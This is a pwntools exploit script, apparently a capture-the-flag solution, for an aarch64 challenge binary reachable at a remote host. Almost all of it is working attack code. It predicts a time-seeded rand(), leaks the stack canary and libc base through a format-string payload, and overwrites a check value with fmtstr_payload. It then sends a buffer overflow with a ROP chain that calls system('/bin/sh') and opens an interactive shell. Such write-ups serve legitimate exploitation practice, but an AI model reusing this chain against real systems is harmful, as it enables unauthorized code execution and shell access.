from pwn import *
import ctypes
LIBC = ctypes.cdll.LoadLibrary('libc.so.6')

context.log_level = "DEBUG"

# ENV
PORT = 1337
HOST = "152.69.210.130"
e = context.binary = ELF('./chall')
# lib = ELF('/usr/aarch64-linux-gnu/lib/libc.so.6')
lib = ELF('./lib/libc.so.6')
# lib = e.libc
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
elif len(sys.argv) > 1 and sys.argv[1] == 'd':
    p = process(["qemu-aarch64", "-g","1234","./chall"])
else:
    p = process(["qemu-aarch64","./chall"])
    pause()

sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
se = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
ru = lambda x : p.recvuntil(x)
rl = lambda: p.recvline()
rec = lambda x : p.recv(x)

# VARIABLE


# PAYLOAD

def exploit():
    def number_quest():
        call_time = LIBC.time
        rand = LIBC.rand
        LIBC.srand(call_time(0))
        randum = rand()
        secret_number = randum % 10000 + 1
        sla("guess: ", str(secret_number))
    canary = 0
    def magic_rune_challenge():
        nonlocal canary
        payload = "%22$p-%33$p-%21$p-"
        sleep(0.5)
        sla("spell: ", payload)
        check_addr = int(ru("-")[:-1],16) - 0x84
        leak_libc = int(ru("-")[:-1].ljust(8, b"\x00"), 16)
        canary = int(ru("-")[:-1].ljust(8, b"\x00"), 16)
        lib.address = leak_libc - 0x274cc
        info("check address: %#x" %check_addr)
        info("base libc: %#x" %lib.address)
        info("canary: %#x" %canary)
        sleep(0.5)
        value = 0xdeadbeef
        write = {
            check_addr : value
        }
        payload = fmtstr_payload(12, write, write_size="short")
        # payload = "aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p"
        sla("spell: ", payload)

    '''
    0x000000000010f28c: ldp x3, x0, [sp, #0x78]; ldp x1, x4, [sp, #0x88]; ldr x5, [sp, #0xb8]; ldr x2, [sp, #0xe0]; blr x5;
    '''
    def treasure_hunt():
        load_x0_x1_x2 = lib.address + 0x000000000010f28c
        binsh_addr = lib.address + 0x14d9f8
        call_system = lib.address + 0x46d94
        bof = b"a"*0x80
        bof += fit(canary,["a"*8], load_x0_x1_x2)
        
        rop = b"a"*80
        rop += fit(canary, canary, ["a"*8]*15, ["d"*8], binsh_addr, 0, 0, 21, 22, 23, 24, call_system)

        payload = bof + rop
        sla("name: ", payload)
    number_quest()
    magic_rune_challenge()
    treasure_hunt()

exploit()
p.interactive()